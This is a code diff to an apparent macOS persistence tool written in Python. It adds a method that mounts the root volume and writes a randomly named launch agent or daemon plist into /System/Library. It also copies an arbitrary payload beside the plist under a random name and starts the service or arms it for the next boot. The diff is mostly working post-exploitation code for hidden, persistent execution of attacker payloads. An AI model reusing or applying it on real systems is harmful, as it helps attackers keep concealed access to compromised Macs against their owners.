@@ -10,6 +10,7 @@ import subprocess
 from pathlib import Path
 
 from support.macos_utilities.persistence_methods import MacPersistenceMethods
+from support.macos_utilities.root_volume import RootVolume
 
 
 BIN_CP:        str = "/bin/cp"
@@ -112,18 +113,22 @@ class LaunchService:
         """
         Install launch service.
         """
+        if variant not in [
+            MacPersistenceMethods.LAUNCH_AGENT_USER.value,
+            MacPersistenceMethods.LAUNCH_AGENT_LIBRARY.value,
+            MacPersistenceMethods.LAUNCH_DAEMON_LIBRARY.value
+        ]:
+            raise ValueError(f"Unsupported variant {variant}")
 
         print(f"Installing launch service ({variant})")
 
-        service_directory = ""
+        service_directory = Path()
         if variant == MacPersistenceMethods.LAUNCH_AGENT_USER.value:
             service_directory = Path("~/Library/LaunchAgents").expanduser()
         elif variant == MacPersistenceMethods.LAUNCH_AGENT_LIBRARY.value:
             service_directory = Path("/Library/LaunchAgents")
         elif variant == MacPersistenceMethods.LAUNCH_DAEMON_LIBRARY.value:
             service_directory = Path("/Library/LaunchDaemons")
-        else:
-            raise NotImplementedError(f"Unknown variant {variant}")
 
         service_directory.mkdir(parents=True, exist_ok=True)
 
@@ -147,3 +152,55 @@ class LaunchService:
             raise RuntimeError("Failed to start launch service.")
 
         print("  Service started successfully 🎉")
+
+
+    def install_root_launch_service(self, variant: str, randomize_name: bool = True) -> None:
+        """
+        Install launch service.
+        """
+        if variant not in [
+            MacPersistenceMethods.LAUNCH_AGENT_SYSTEM.value,
+            MacPersistenceMethods.LAUNCH_DAEMON_SYSTEM.value
+        ]:
+            raise ValueError(f"Unsupported variant {variant}")
+
+        print(f"Installing launch service ({variant})")
+
+        root_obj = RootVolume()
+        mount_path = root_obj.mount()
+
+        service_directory = Path(mount_path)
+        if variant == MacPersistenceMethods.LAUNCH_AGENT_SYSTEM.value:
+            service_directory = service_directory / "System" / "Library" / "LaunchAgents"
+        elif variant == MacPersistenceMethods.LAUNCH_DAEMON_SYSTEM.value:
+            service_directory = service_directory / "System" / "Library" / "LaunchDaemons"
+
+        service_name = f"com.{random.randint(0, 1000000)}"
+        service_file = service_directory / f"{service_name}.plist"
+        service_file.touch()
+
+        service_file_path = service_file.resolve()
+
+        # Copy payload file to safe location.
+        payload_new_name = f"{random.randint(0, 1000000)}" if randomize_name else Path(self.payload).name
+        payload_file = service_directory / payload_new_name
+        subprocess.run([BIN_CP, self.payload, str(payload_file)], capture_output=True, text=True)
+
+        # Set payload to when root volume is sealed.
+        if mount_path != "/":
+            payload_file = Path(str(payload_file).replace(str(mount_path), ""))
+
+        print(f"  Relocated payload: {payload_file}")
+        print(f"  Service file: {service_file_path}")
+
+        plistlib.dump(self._build_launch_service(name=service_name, arguments=[str(payload_file)]), service_file_path.open("wb"))
+
+        if mount_path != "/":
+            # Can't start service if root volume is sealed.
+            print("  Service will start on next boot")
+        else:
+            if not self._start_launch_service(str(service_file_path)):
+                raise RuntimeError("Failed to start launch service.")
+            print("  Service started successfully 🎉")
+
+        root_obj.unmount()
